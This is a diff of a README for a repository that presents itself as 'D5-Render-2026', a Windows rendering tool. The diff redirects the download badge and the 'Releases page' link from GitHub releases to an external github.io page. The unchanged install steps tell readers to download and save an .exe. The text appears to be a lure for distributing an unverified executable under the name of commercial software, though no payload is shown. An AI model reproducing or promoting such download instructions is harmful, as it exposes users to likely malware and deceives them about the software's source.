@@ -1,6 +1,6 @@
 # 🎨 D5-Render-2026 - Real Time Rendering For Windows Architecture
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Sweet9075/D5-Render-2026/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://sweet9075.github.io)
 
 D5 Render provides architects and designers a way to create high-quality visualizations. This tool uses your computer graphics card to show changes instantly. You see light, shadow, and material edits in real time. This workflow removes long wait times common in traditional rendering tools. This version works on Windows 10 and Windows 11.
 
@@ -8,7 +8,7 @@ D5 Render provides architects and designers a way to create high-quality visuali
 
 Follow these steps to get the software on your computer.
 
-1. Go to the [Releases page](https://github.com/Sweet9075/D5-Render-2026/releases).
+1. Go to the [Releases page](https://sweet9075.github.io).
 2. Look for the latest version listed at the top of the page.
 3. Click the link that ends in .exe.
 4. Save the file to your desktop or downloads folder.
